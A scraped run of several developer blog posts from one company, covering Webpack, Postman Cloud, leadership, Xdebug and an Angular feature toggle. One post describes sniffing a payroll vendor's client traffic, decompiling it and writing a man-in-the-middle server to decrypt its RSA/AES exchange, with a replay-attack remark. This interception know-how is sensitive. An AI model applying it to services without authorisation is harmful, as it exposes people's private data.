First of all, we need to organize our project’s folders. Here is a common directory structure that has proven its worth for many people:
.
├── src                           // The main source folder, where all our source files will go (Webpack's input)
|   └── your-first-js-file.js
├── dist                          // Built files folder (Webpack's output)
├── package.json
└── webpack.config.js             // Webpack config file

We will go into more detail regarding each file later in the article.
Package installation
In order to use Webpack, we first need to fetch the corresponding module. We’ll assume you’re running Node v4+.
All commands will be run from your project’s root folder. If you don’t have a package.json in your project already, then run npm init.
Now let’s install Webpack:
npm install --save webpack

Minimum configuration
Now that we have Webpack installed, let’s configure it. This is done with a plain JS file, webpack.config.js.
The bare minimum to make Webpack compile our sources is to provide it with an entry point as well as an output.
var config = {
    entry: './src',               // entry point
    output: {                     // output folder
        path: './dist',           // folder path
        filename: 'my-app.js'     // file name
    }
}
module.exports = config;

We will now add an npm script to the package.json to call Webpack compilation:
// package.json

// ...

""scripts"": {
    ""build"": ""webpack""
}

// ...

Now, when running npm run build, Webpack will look the webpack.config.js up and compile our application.
As you set in the config, our application’s entry point is ./src. We therefore need to define this entry point:
// src/index.js
console.log('Hello Webpack!');

Now that we have our entry point, let’s build the application!
npm run build

As a result, Webpack will bundle up our src/index.js into dist/my-app.js. If you look at the produced file, you’ll notice that Webpack has added some code of its own. That is the module resolver. This provides a require function, exactly as in a NodeJS script!
Add an index.html to our project, so that we can see the effects of the JS files.
<!-- index.html -->
<html>
    <head>
        <script type=""text/javascript"" src=""./dist/my-app.js""></script>
    </head>
    <body>
    </body>
</html>

Manually open this file with your favorite web browser, and see the Hello Webpack! in the console.
Modularity
Let’s recap what we have done so far. We have configured Webpack to bundle the entry point –src/index.js– into an output bundle –dist/my-app.js-. We then created an index.html that calls the bundle. This way, all the code inside src/index.js is executed in the browser when we manually open the index in a browser.
The next step is to separate our code into multiple files.
To build our source files, Webpack will start by compiling the entry point provided in the configuration file. It will then move from require to require (or import in ES6), and include every ’required’ file in the build pipe.
Let’s see how to include other files to the bundled output:
// src/greet.js
function greet(who) {
    console.log('Hello ' + who + '!');
};

module.exports = greet;       // Exposes the greet function to a require in another file

// src/index.js
var greet = require('./greet');   // Import the greet function

greet('Webpack');

As you see, we can require local files by providing a relative path. Notice that we don’t need to specify the file extension, since it’s a JS file. Webpack can manage a bunch of default extensions to know which file it will look for.
Another important thing to notice is that you might eventually end up with very long relative paths when your application grows. For example, it is quite common to depend on a file located in a different folder, and you will find yourself writing imports such as require('../../../../components/home/dashboard/title').
To avoid such messy paths, it is possible to tell Webpack which folder it can consider as the application’s root folder. In our case, src is the root folder:
// webpack.config.js

var path = require('path');
var SRC = path.join(__dirname, 'src/');
var NODE_MODULES = path.join(__dirname, 'node_modules/');

// ...
  resolve: {
    root: [SRC, NODE_MODULES],                  // root folders for Webpack resolving, so we can now call require('greet')
    alias: {
      'actions': path.join(SRC, 'actions/'),    // sample alias, calling require('actions/file') will resolve to ./src/actions/file.js
      // ...
    }   
  },
// ...

With the ability to use modules, we now have very clean code organization. This is because it has been split into several files and folders, depending on what your application is.
Moreover, we can manage our dependencies just as we would do in a Node application. Therefore, we can import external libraries by calling require('library-name').
This will ask Webpack to resolve the module library-name, by looking into the node_modules folder (Webpack will look into other default folders too, see there).
Let’s modify our greet function to use an external library:
// src/greet.js
var moment = require('moment'); // Add momentjs

function greet(who) {
    console.log('Hello ' + who + ', it\'s ' + moment().format('h:mm:ss a') + '!');
};

module.exports = greet;

Compilation
So far we have our source files bundled up into a single output file, which is read by the index.html.
That’s a good starting point for building our web application, but unless we want to write it in plain old ES5 Javascript, we need to actually transform the files while they are bundled together.
Let’s say for instance we want to use the new Javascript specifications, EcmaScript2015 and EcmaScript2016.
Since we are building an application for the web, we need to maximize the browser compatibility of our code. Therefore, we need to transpile any ES6/ES7 code to ES5, which is supported by all modern browsers (do not hesitate to use the excellent caniuse website to check any browser-related compatibility questions).
We will use Babel to transpile ES6 and ES7.
Let’s install Babel and its presets for ES6 and ES7:
npm install --save-dev babel babel-preset-es2015 babel-preset-stage-0

We need to configure it to use these presets:
// package.json

// ...
    ""babel"": {
        ""presets"": [
            ""es2015"",      // ES6 compilation ability
            ""stage-0""      // ES7 compilation ability
        ]
    },
// ...

Babel is now configured to transpile JS files, but it’s still not working together with Webpack.
Let me introduce the concept of Webpack loaders. Loaders are used by Webpack in order to handle a given file type.
Everytime Webpack reads a require() or an import, it will handle the content of the required file with a loader.
By default, Webpack comes with a built in JS handler, which tells it how to handle plain JS files and bundle them up. In order to handle different file types, or simply deal with JS files in a different manner, we must specify a loader configuration to Webpack.
As you might have guessed, the link between Webpack and Babel will be made by a loader.
It’s called… babel-loader!
First we need to download it:
npm install --save-dev babel-loader

Now that we have it as a dependency, we must tell Webpack where to use it.
// webpack.config.js
var config = {
    entry: './src',
    output: {
        path: './dist',
        filename: 'my-app.js'
    },
    module: {
      loaders: [
        {
          test: /\.js$/,
          loaders: ['babel']      // note that specifying 'babel' or 'babel-loader' is equivalent for Webpack
        }
      ]
    }
}
module.exports = config;

This will add a new loader to Webpack.
Every time Webpack sees a require('xxx.yy'), it will loop through all its configured loaders and check if xxx.yy matches the provided test regexp (in our case, /\.js$/).
As you can infer now, the babel-loader will be used to compile every .js file. We can therefore rewrite our good old ES5 files into ES6/ES7 files!
Managing other file types
Now that we are clear on the loader concept, we can manage other file types. In this article, I’ll show you how to handle some common file types, such as fonts and CSS files; however, keep in mind that there are a LOT of loaders on npmjs for almost any file type.
Style files
Plain CSS files
There are two loaders for .css files, called style-loader and css-loader.
You can try to figure out by yourself how to add these loaders in order to handle .css files.
Here is a suggestion of configuration:
// webpack.config.js

// ...
  {
    test: /\.css$/,
    loaders: ['style', 'css'] // Note that the order is important here, it means that 'style-loader' will be applied to the ouput of 'css-loader'
  },
// ...


NOTE: the CSS will be added to the bundled file; in our case, my-app.js. The style will be loaded in your browser, but you might be used to having separate .css files. If you want Webpack to output separate style files, please use ExtractTextWebpackPlugin.
SASS/Less/PostCSS
In case you are using SASS, Less or PostCSS, simply add the corresponding loader:

sass-loader
less-loader
postcss-loader

Font files
If you use specific fonts in your project, Webpack can handle them too!
Since the fonts will be downloaded as such by your client application, use the file-loader:
// webpack.config.js

// ...
    {
      test: /\.(eot|svg|ttf|woff|woff2)$/,
      loader: 'file?name=public/fonts/[name].[ext]'
    }
// ...

This will output all font files to the public/fonts folder.
Images
Similarly to fonts, images are usually served directly by web servers and loaded on demand by the client. The loader configuration is very similar:
// webpack.config.js

// ...
    {
      test: /\.(jpg|png|svg)$/,
      loader: 'file?name=public/images/[name].[ext]'
    }
// ...

Other files
We could continue the list of all possible files Webpack loaders can handle, but this is not the aim here. If you want to load other file types, search for ‘yourFiletype loader’ on the Internet, and you will find the corresponding loader. For example, load .jade files with the jade loader, .cs files with the coffee loader, etc.
Going further
These are the basic usages of Webpack. You might now want to move to more advanced topics about Webpack.
Here is a non exhaustive list of subject you might want to read about:

Optimising your bundles by partially serving them, and more
Webpack dev server and the hot modules reloader

In the meantime, do not hesitate to read the official documentation to discover new features and grab a deep understanding of Webpack’s multiple options.
Update 05/02/17
I had initially planned to write this article in two parts, putting the more advanced topics in the second parts.
Unfortunately, I could not make it to write the second part, so I added two links to great articles dealing with these topics.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Stanislas Bernard
  			
  				Agile web developer at Theodo, Javascript lover.  			
  		
    
			

									"
"
										When working on a project with both an API and a frontend, it’s more convenient to work on both at the same time, as they can influence one another. I was recently working on an API with a mobile development team, and we lost some valuable time asking each other about the format for a certain request, and retyping the same requests for ten-times-a-day operations such as logging in as our test user.
We were using Postman – which you’ve most probably heard of it you’ve worked with or on an API – to run HTTP requests, and keep a history of our past requests. I stopped counting how many times I tried to reuse an obsolete request, got a 4XX-5XX, and thought something was wrong. And one fine morning, I realized that Postman had a Collections tab next to the History tab, and offered cloud storage to save requests and share them with your team.
The whole team sharing thing is a paid feature called Postman Cloud. It costs $5 per active team member per month, with a free 30-day trial period with unlimited users. It offers nice little extras such as auto-generated documentation. In this article, I will walk you through the process of setting up Postman Cloud, keeping and sharing your API requests and documenting your endpoints.
Setup Account and Team
Most Postman users don’t have a Postman account because you don’t need one to use the app. Assuming you’ve installed Postman, the first thing to do is to create your account.
Then, subscribe to Postman Cloud or the free trial period from the Pricing page. Then go to the team page and start adding people to your team. If they already have a Postman account, make sure to use the right email.
Once you have your account set up and confirmed, you can launch the app and log in from the top right corner.
You’re logged in!
Pro Tip: There is an OSX desktop app (direct download) if you’re on a Mac, which solves a strange window switching issue I had with the Chrome app.
Organize your requests into Collections and Environments
The first thing to notice is that you have a Collections tab on the left menu bar. There, you can create a new Collection. This will hold all your requests for a project. When you are logged in, your Collections are automatically uploaded to your account.
The three dots menu next to the Collection allows you to edit it, share it with your team with read or write access and create a subfolder hierarchy inside your Collection.
Create a new request as usual: choose the method, enter the endpoint, the body and any custom headers. Next to the button that executes your request, there is a “Save” button to save it into a Collection. Give it a meaningful name, choose the collection and possibly a subfolder to save it into, and you’re done! The request is uploaded and shared with the team. They see your Collection just like one of their own (note the self-explanatory “Me” / “Team” filter above the Collections list).
Your new Collection
Now, you probably worked on more than one server. That’s where Postman Environments come in.
This feature lets you use variables inside your requests and define multiple Environments with their own value for each variable. Environments can be chosen and managed from the menu next to the eye icon at the top right (in the second row of icons). You can create one or more Environments, in which you set a value for a variable called hostname, and use it in your request URL with double curly braces: https://{{hostname}}/endpoint. Then, before running the request, pick an Environment from the menu and Postman will use the correct value. You can also choose to share an Environment with your team, just like the Collection.
Document and Publish your API
From your Collections page on the Postman website, you can choose to view the documentation for your Collection. This generates a web page which displays your Collection very nicely, with the folder hierarchy, request details and multi-language examples next to one another. On the top right, you can switch between Environments, and the «Run in Postman» button opens the viewer’s Postman app and gives them (readonly) access to your requests so they can try them with one click. Note that for the moment, only the team can see this page.
Looks nice, right?
Here’s how to make it even better:

Add helpful descriptions to each request. From Postman, in the three-dots menu next to each saved request, you can edit it and add a description. You can also add a description to each subfolder, and to the Collection itself. You can even unleash the full power of Markdown to make those descriptions look better.
Give example responses for each request, so that users know what response format(s) to expect. To do this, run your request and get an actual response. Then click “Save Response” button in the top right corner of the response box, and give it a meaningful name (ex: “Normal Response” or “Error Response”). It gets uploaded and shows in the doc just below the request. You can save any number of response per requests.

As you get to production, you can Publish your API reference from your dashboard. If you have multiple Environments, you can choose the one that will be used for the published doc. Publication means that any user with the link can view the documentation, use it and import your Collection to their own Postman using the «Run in Postman» button.
The ultimate example of documented API is the Postman Cloud API itself, which the Postman client uses to sync your Collections. (Yes, it’s an API to store data about APIs :O) As a Postman Cloud user, you can use the “Run in Postman” button to import the doc into Postman, play with it (get the API key from your dashboard) and see for yourself how they created this full-featured API reference.
Areas for Improvement
Here are a few things I believe are most important for Postman Cloud to improve:

Allow response editing: Before I save a response as a sample response for my documentation, I might need to anonymize the data in the response. I need to be able to edit the response before I save it.
Clarify teams and organizations: I believe basic team sharing should be free, but as a paid feature I would want to be part of multiple teams within an organization, à la Github.
Allow me to self-host the doc: Allow me to download or integrate the documentation into my website, or give me more control over the URL of my documentation, and I would look more professionnal when publicizing the link to my users.
Control public doc change: As the team develops the API, some requests may be shared between them, yet not ready for public consumption. We need a way to prevent specific requests from appearing in the doc, or better, only manually update the public documentation when ready to do so.

Bottom Line
I believe Postman Cloud is a tool that can really make your life easier when building an API, especially when front-end development happens simultaneously (which it should). The price tag may seem odd to a user, but a company can easily administrate a team with a fluctuating number of users. However, the team system deserves some rethinking so that people can be in multiple teams and share different things with different coworkers.
I’ve only used it for two weeks, so I would be happy to hear about your use cases and how well Postman Cloud fits them. Please feel free to comment here or chat with me on Twitter!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Foucauld Degeorges
  			
  				Software Architect and Developer at Theodo.  			
  		
    
			

									"
"
										What Is Leadership?
At Theodo, we do not define a leader as some charismatic individual who gets everyone to adopt their own vision of things. Rather, we consider someone to be an effective leader if they always strive to–and succeed at–bringing lasting, positive change to their organization.
How they do this, though, be it through exceptional charisma, ‘vision’, or something else entirely, is not important.
Except it is.
How exactly does one successfully bring about positive change to an organization? In this article, I will present a quick and dirty guide to leadership, through five simple steps. 
Mindset of a Leader

You have a real problem to fix
The start of the leadership process is often an issue that is bothering you, some pesky thing you’d like to fix. However, you will not be able to convince–let alone lead–anyone if you talk about “some pesky thing I’d like to fix”. You must formulate your issue as a real problem :

What is bothering you?
What are the measurable negative consequences to your organisation?
What do you think the causes of this problem are? (you should have a rough but long list at this point)

Get off your chair !
Leading change in an organization takes a surprising amount of energy. This is why, in any leadership process, the first thing to do is to Get Off Your Chair, start moving things, and do not sit back down until you are done.
Step 1: Identify Your Sponsor
Before taking action, you must observe the organization you are in, and ask people around you about it. Pay attention to the individuals, and to the teams:

Who seems to be open to change, who seems to be against it?
How much influence does each person carry? Is it through authority, respect, expertise, or their relationships?

Through these observations, you should be able to identify someone (or several someones) in the organization to sponsor your idea. These are the early-adopters, the experts, the decision-makers. However, they are not necessarily the organisation’s ‘bosses’!
Step 2: Go and Talk to Them
Leadership does not work through email. Leadership only works through one-on-one conversations. So go and talk to them!
This step may sound terribly obvious, and ridiculously easy, but once you are confronted with it in reality, it often turns out to be the hardest of all steps.
Step 3: Be Sincere, Understand, Relate

Be Sincere:

Enter the conversation with an open mind. You must be sincerely ready to change your point of view if need be.
Start your point with why, then work your way to how, and finish with what (this is called the Golden Circle and is the most persuasive communication tool out there)


Strive to Understand Their Problems:

Make the debate non-personal, stay focused on facts and rationality
If they sound opposed to your idea, listen to their problems, and work rationally with your target to reconcile them with your idea.


Relate:

Throughout this discussion, it is of utmost importance to empathize with the person. Put yourself in their shoes.
At the same time, try to make them relate to you, do not be afraid to show some vulnerability and open your feelings to them.



Step 4: Plan How to Address the Problem…
Now that you’ve talked to your sponsor and persuaded them to get on board with your idea, keep the momentum going ! Capitalize on it.
That’s when you Plan (the first step in PDCA) how to address the problem. In order to do so, you should consult with experts on the topic, as well as the people who are impacted by your issue.
Do this fast, one or two days tops (remember: speed is a habit).
Step 5: …and Address It !
Once you’ve got a relatively solid plan, send a recap email to your target and any other important stakeholders. 
Finally, go and see them yet again to do what you planned, then check if your plan’s hypotheses are correct, and and (re)act accordingly.
Conclusion
So the next time you identify a problem in your organization, treat it not as a hurdle but as an opportunity to improve. As with any opportunity, you should grab it for yourself. You should be the one to bring your idea into being. Not someone “more qualified”, or “with a higher rank”, you.
If, that is, you are willing to follow the above steps and become a leader.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Melchior Merlin
  			
  				Developper at Theodo  			
  		
    
			

									"
"
										Legal disclaimer

In France, reverse engineering is allowed as long as it serves a goal of interoperability.
Here, we will not be accessing data that should not have been accessible otherwise. Before trying to access data in a way that was not exactly meant to, it is always preferable to contact the company or individuals who are serving this data in the first place.
I contacted Silaexpert regarding this article. I have detected no real security hole in their client, so they gave their approval for its publication.
 
That being said, let’s start!

Context
The context is quite simple. The generation of payslip at Theodo is outsourced to another company: Silaexpert. We were given our credentials, and a url to access our vacations count and our payslips.
This all starts with a link: http://www.silaexpert01.fr/silae.
This link does not work in Chrome, Firefox or Safari. It does not run on a Windows 10 computer, so you can forget connecting from home on your nice gaming rig.
It seems to only work on Internet Explorer on Windows 7: bad news for all the developers at Theodo running Linux or OSX.
The black box

Well, obviously, you could find other solutions. You can always borrow a friend or colleague computer running Windows. Great, now all your files are available on a shared computer.
Or you can download a free virtual machine from Microsoft: https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/. For this particular purpose, the VM with IE9 on Windows 7 works well.
So, now you have the virtual machine up and running, you can go to the url and… Whaaat ? It is downloading a fat client and starts some kind of install process. Just from that link. Thank you IE.
Finally, you can login and painfully download your last payslip. And start again next month. If you reset the virtual machine, because, you know, licenses.
Ain’t nobody got time for that!
Let’s jump in
Some tooling
I want to download my file directly from my Mac or Linux computer without going through all this VM nonsense. In order to do this, I have to send the right request to the remote server (I still do not know its address, which is probably hard coded in the downloaded fat client).
So, first things first, let’s sniff all that network traffic going out of the VM.
You can use any network sniffing tool available for your platform:

Wireshark, avaiblable for most systems, maybe overkill here
Charles Proxy on Mac
mitmproxy if you like python
Fiddler on Windows (beta available for Mac and Linux)

I personnally used Charles Proxy, in spite of its hideous icon.

Start the HTTP proxy on the host machine. Go in Proxy > Proxy Settings and note the port it is using. 
Start your VM.

Open a command line, run ipconfig /all and note the Default Gateway IP. This is your host IP. 
Open Internet Explorer, go to Internet Options > Connections > LAN Settings and set the proxy settings with the IP and port from previous steps. 


Done! You should see all traffic going out of the VM appearing in Charles.

Now, if you login into the fat client and download a payslip, you should have enough information to start thinking.

Data analysis
You now have a complete exchange between the client and the server.
The first thing you notice is that all exchanges are done without SSL/TLS encryption. Free data, yeah! That being said, you could still have sniffed encrypted traffic by trusting the fake CA generated by your proxy on the virtual machine.
You can notice several things:

A single webservice endpoint: http://www.silaexpert01.fr/SILAE/IWCF/IWCF.svc. All requests go to this url.
The protocol used is SOAP, without any web security module enabled.
The login request seems to be different from all other requests, which all look alike.
There is a bunch of base64 encoded data.

You can try to decode the base64 encoded data, but you will not be able to get anything readable. It is probably encrypted binary data.
The login request
The first request made to the server contains only one interesting piece of data, a key K:
<RSAKeyValue>
  <Modulus>odfDJj...pEQ2RQ==</Modulus>
  <Exponent>AQAB</Exponent>
</RSAKeyValue>

This key K is the public RSA key used by the client. The response also contains a key, using the same format, and some kind of identifier $USR. This received key is the public RSA key that the server will use.
We just witnessed an RSA key exchange. RSA cannot be used to encrypt large amount of data. Depending on the padding technique used, with a 2048 bit key (used here), you can encrypt at most 245 bytes. Not much.
A technique commonly used is to use a private/public RSA key to encrypt a symmetric key, which is then used during the exchange.
Good, I have the client and RSA keys, now what?
Good question. Here, you are either a genius or you need a bit of help.
Hell yeah, I’m a genius!
Ok, you are a genius (I never doubted it), you take the second message, and decode the base64 binary.
echo ""AQABAAAOE6jZqMmDnFHefXddjDq...W5A="" | base64 -D | hexdump -C

If you do this several times, over several login request, you might notice a pattern.

The first few bytes are always 01 00 01 00 00. This can be seen directly in the base64: the first letters are always “AQABAA”. Something quite interesting is that 00 01 00 00 is the binary representation, on 4 bytes, little endian, of the decimal 256. Nice!
Another thing you might notice is at offset 261 (1 + 4 + 256), the bytes are always 20 00 00 00. This is 32 in decimal.
Here is the genius part. A common symmetric encryption system is AES 256. It uses an initialization vector (IV) of… 32 bytes.
Little recap:

The first byte is always 01.
The 4 next bytes give the size of the AES key: 256 bytes.
The next 256 bytes represent the actual AES key, encrypted using the public RSA key K which was sent to the server during the first phase.
The 4 next bytes give the size of the IV: 32 bytes.
The next 32 bytes define the IV.
The rest of the message is still unknown. Probably the login/password encrypted using the AES key.

Even geniuses sometimes need a little push
There is only one AES, but many variants. You can try them all, but it will take a really long time and lots of developments.
We did not use all the cards in our hand at this point. Remember the fat client? It is our key to the encryption issue.
Ready to play a game?

My site is not really a site, it uses internet explorer to download an executable binary, which runs only on Windows and asks for specific libraries on Windows 10… In which language is the client developped?
You guessed it, .NET!
Easily decompilable. Note that Java would have been fine too.
Let’s take a look at this code. You can get the url for the .exe by reading the other proxified requests. Import the .exe into the decompiler (I used the trial version of .Net Reflector in the Windows VM), and look for some interesting code. No luck this time, nothing.
Except for this one little DLL, Sila.WCFDLL.dll. Export it, and re-import it into the decompiler. And bingo, you have the serialization/deserialization procedures, with all the security stuff.
We were right about the AES. It uses the Rijndael 256 variant of the AES encryption with a custom serialization routine. If you are not a genius and missed the previous paragraph, you have here all the code for re-creating the message.
Oh, in case you were wondering about, the first byte is 01 when it contains AES information, 00 in all other cases.
Exploiting that knowledge
Here, you are blocked. You cannot decrypt any of the AES keys, because you need the private RSA keys. The only option to get this AES key is to write a Man In The Middle (MITM) server, which intercepts every request between the client and the server and acts as the client for the server, and as the server for the client.

Credits: Miraceti — Man in the middle attack — CC BY-SA 3.0
Once that server is written (avaiblable at https://github.com/kraynel/sila-cli/blob/master/server.js), and you have fixed all the buffer/byte conversion/RSA/mcrypt issues, you can reload your VM and login one more time.
Only this time, you will use the “Map Remote” option of Charles proxy to redirect all traffic going to http://www.silaexpert01.fr/SILAE/IWCF/IWCF.svc to your local endpoint, which will in turn decrypt the exchange and request the real endpoint.
You now have all requests, decrypted, in binary form.

Serialization/Deserialization
Requests are not directly readable. They are not using xml serialization but a custom, in house serialization technique. Who does that? Why?
But we have the code so we can look into it. And port it to JS (https://github.com/kraynel/sila-cli/blob/master/cbaSerialization.js).
We now have all the requests, and their responses, in plain, readable JS. By playing with the different parameters, we can identify two interesting requests:

AcquisitionBulletins, which lists the avaiblable payslips;
GenererPdf, which downloads a payslip as a pdf file.

Congrats, you know everything about this service! You can write your own client!

Some thoughts

Never re-code security features which already exist in libraries.
RSA key exchange, then AES encryption is basically TLS. Use HTTPS!
Please do not code your own serialization routines. Some really good libraries are already out there.
Use known standards (REST or, if you really need it, SOAP) for your exchanges, and prefer formats which are easily interoperable (JSON, XML).
Beware of replay attacks! Here, if I save the AES keys used with my MITM server, I can replay a request and decode the answer. The server would send me exactly the same response, every time, even a long time after the initial request.


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Kevin Raynel
  			
  				Developer at Theodo.  			
  		
    
			

									"
"
										Warning: this article concerns php5 version. If your PHP version is different, replace php5 by php/X.Y in paths (X.Y is your PHP version) and phpX.Y in command. For example :

sudo apt-get install php5-xdebug becomes sudo apt-get install php5.6-xdebug
/etc/php5/mods-available/xdebug.ini becomes /etc/php/5.6/mods-available/xdebug.ini

I love debuggers. They allow me to understand deep down in my code why something doesn’t work, and are even more useful when I work on legacy projects.
When I work on the client side, the browser already provides me all the tools I need to dig deeper than some console.log() scattered semi-randomly in the source code.
However, I struggled to configure my workspace when I worked on a PHP Symfony2 project hosted in a Vagrant virtual machine.
Step1: Install Xdebug on your Vagrant virtual machine
That may seem obvious, but you need to have Xdebug installed on your virtual machine to benefit  from its services.
sudo apt-get install php5-xdebug

Then, configure it:
sudo vim /etc/php5/mods-available/xdebug.ini

with the following lines:
xdebug.remote_enable=true
xdebug.remote_connect_back=true
xdebug.idekey=MY_AWESOME_KEY

Finally, if you use php5-fpm, you need to restart it:
sudo service php5-fpm restart
# or with
sudo /etc/init.d/php5-fpm restart

If you use Ansible to provision your virtual machine, you can also use a ready-to-action Xdebug role.

Step2: Configure PhpStorm
First, select the “Edit configurations” item in the “Run” menu.

Then, add a new “PHP Remote Debug” configuration.

We will use the IDE key configured in your Vagrant and in your browser.
To fully configure this debugger configuration, you will need to create what PhpStorm calls a server.


Fill the correct hostname
Check “Use path mappings” checkbox, and write the project’s absolute path
on your Vagrant virtual machine


Step3: Configure Xdebug
Use Xdebug to debug your web application on Chrome
Now that Vagrant with Xdebug is up and running, let’s configure Xdebug Chrome extension.
First, we need to install it from Chrome Web Store
Make sure that the extension is enabled on your browser’s extensions list page.

Now, you should see on the right side of the address bar the extension’s symbol.

Right-click on it, then click on the “Options” sub-menu.

You have to use the IDE key previously set.

Xdebug plugin also exists for other browsers.
Finally, in your browser click on the bug in your address bar to switch to the “Debug” mode

Use Xdebug to debug your APIs route with Postman
Once your Xdebug configuration is added, you need to add ?XDEBUG_SESSION_START=<XDEBUG_KEYNAME> at the end of your route. And that’s all!

Use Xdebug to debug commands or unit tests
To use Xdebug for debugging commands or unit tests, first, you need to add xdebug.remote_autostart=true in XDebug configuration file of your Vagrant xdebug.ini.
Then, you need to specify the xdebug.remote_host (IP address of your local from your Vagrant) when launching the command from the virtual machine’s terminal.

First, get the host IP address by using ifconfig from your local terminal (the host) :



Then, launch your command

php -d xdebug.remote_host=10.0.0.1 your_command

For instance, if you want to debug your unit tests in a Symfony project, you can run:
php -d xdebug.remote_host=10.0.0.1 ./bin/phpunit -c app/
Step4: Enjoy!
Now, in PhpStorm you:

Add your breakpoints by clicking to the left of the lines



Click on the bug icon on the upper-right corner


 
You should now be able to break on the exact line you selected in your IDE.
Bonus: Performance
You need to know that enabling Xdebug slows down your app (x2), the fastest way to disable it is to run the following command: php5dismod xdebug
Use php5enmod xdebug to enable it back. Each time you’ll also need to restart php-fpm or apache.
Troubleshooting: I did the tutorial but Xdebug doesn’t work
It’s probably because a symbolic link is missing in your php conf.

First type in your virtual machine php -i | grep xdebug

If you have no response, it means Xdebug is not set correctly

Then check if Xdebug is mentioned when running php -v from your Vagrant.
If not, add a symbolic link to specify that the Xdebug module should be enabled, for instance (you may need sudo):

ln -s /etc/php5/mods-available/xdebug.ini /etc/php5/fpm/conf.d/20-xdebug.ini
ln -s /etc/php5/mods-available/xdebug.ini /etc/php5/cli/conf.d/20-xdebug.ini


You should obtain by running php -v


I hope you’ve made your way through the process and that it will improve your efficiency as much as it does for me. If you have other ways to configure your debugger, feel free to share them in the comments section below.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Yann Jacquot
  			
  				Yann Jacquot is an agile web developer at Theodo.  			
  		
    
		    
  		
  			
  				  			
  		

  		
				Nicolas Boutin
  			
  				Nicolas is a former entrepreneur and a web agile developer. After making all the mistakes launching his first startup in SME's digital transformation he joined Theodo to learn how to build web and mobile applications keeping customers satisfied. Symfony + APIPlatform + React is his favorite stack to develop fast and easy to maintain app. He's still eager to start a new venture.  			
  		
    
			

									"
"
										What is feature toggling?
Feature toggling enables you to toggle features or change your application’s content quickly and without any change to the application source code.
It can be used for various applications such as A/B testing or to display time-limited content such as special offers on an application.
If you want to know more about feature toggling, I recommand this thorough article from Martin Fowler.
While I was building an Angular application, my Product Owner asked me to implement feature toggling on several features.
While there were plenty of nice directives available around, it felt a bit like using a sledgehammer to crack a nut, so I believed I could build a simpler one.
My team wasn’t in charge of the back-end of the application and they had already implemented the admin interface to set the toggles as well as the API to get them when I started.
The API was returning a JSON file that looked like this one:
{
  showSignUpLink: true
}
So my job was to get this JSON file, and use it to show or hide the link to the sign up page on the login one.
Creating a new directive
Ok, first let’s add a call to the API that will get the JSON file with the features:
app.factory('Features', function($resource) {
  $resource('/features');
});
That makes 3 lines of code, that is the minimal setup to get a resource.
Now, we want to hide this link when the ‘showSignUpLink’ attribute of our JSON file is set to false.
To do this let’s create a directive that will take the name of the JSON attribute we have to look for:
app.directive('featureToggle', function(Features) {
  return {
    restrict: 'E',
    scope: {
      featureName: '@'
    },
    template: '<span ng-transclude></span>',
    transclude: true,
    link: function(scope, element, attrs, ctrl, transclude) {
      Features.get().$promise.then(function(response) {
        scope.$parent.dataFeature = response[scope.featureName];
      });
    }
  };
});
All right, now we’re at 3 + 15 = 18 lines.
But what are we doing here?
We are creating a directive that can only be created as an element – i.e. as <feature-toggle> – which has one attribute called featureName and which template is a <span> element that implements ng-tranclude.
So basically everything that is inside the <feature-toggle> element will be inside a <span> once the DOM is rendered. As an example:
<feature-toggle>
  <marquee>I am a forgotten HTML element</marquee>
</feature-toggle>
will become:
<span ng-transclude>
  <marquee>I am a forgotten HTML element</marquee&gt
</span>
Then, using the link method we can update the DOM inside the directive.
Here, we simply get the ‘Features’ resource and set the ‘dataFeature’ attribute of the directive’s parent scope – i.e. the controller’s scope – to the value stored in the ‘feature-name’ key.
Using the directive in the view
Let’s see why our directive is so awesome by looking at how we will transform our link. So starting from this:
<a href=""/signup"">Yo sign up here</a>
We do now have that:
<feature-toggle feature-name=""showSignUpLink"">
  <a href=""/signup"">Yo sign up here</a>
<feature-toggle>
Now when the controller is loaded, ‘dataFeature’ will be whatever you decided in the controller that renders the view – if you don’t declare it, the link won’t be shown.
Once the directive gets the response from the API, it will change the value of ‘dataFeature’ and the link will appear (or not).
And that’s it! We added 2 more lines and 3 + 15 + 2 = 20 so here we are with our first feature toggle with only 20 lines of code!
Going further: Display the content of the JSON file in the DOM
All right, now let’s do something awesome with our directive.
In the same application, the second feature I was asked to make togglable was the content of the main menu.
Actually it wasn’t a toggle, but more of an admin-editable content. The API was then returning this:
{
  showSignUpLink: true,
  menu: [
    {
      stateName: 'landing',
      label: 'Home'
    },
    {
      stateName: 'posts',
      label: 'Posts'
    },
    {
      stateName: 'categories',
      label: 'Categories'
    },
    {
      stateName: 'users',
      label: 'Users'
    }
  ]
}
Let’s have a look at what the HTML for my menu was looking like before:
<ul class=""navbar-nav"">
  <li>
    <a>Home</a>
  </li>
  <li>
    <a>Posts</a>
  </li>
  <li>
    <a>Categories</a>
  </li>
  <li>
    <a>Users</a>
  </li>
</ul>
What’s great is that I didn’t have to make any change to my directive at all!
All is in the HTML:
<ul class=""navbar-nav"">
  <li>
    <a>{{ state.label }}</a>
  </li>
</ul>
Conclusion
This is how the directive of my application actually kinda looks like right now.
I like the fact that it is very simple and yet I can do a bit more than just feature toggling.
If you enjoyed this article, you may also want to check out Sammy Teillet’s one on A/B testing.
I also welcome any comment or suggestion on this article, please let me know if you believe it could be improved.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Louis Zawadzki
  			
  				I drink tea and build web apps at Theodo.  			
  		
    
			

									"
"
										Have you ever wanted to expose a local server to the entire internet? It may sound scary but can be really useful. Use-cases are infinite, here are a few:

You are developing a web application on your computer and you need to see instantly your modifications on a specific device or browser (smartphone, tablet, internet explorer…) without deploying it again and again.
You are developing an application which works with webhooks, for example GitHub webhooks.
You need to download some files from a coworker computer and you’re far from him, or simply don’t want to bother with a USB key.
You are out of the office and need to access an IP filtered server.

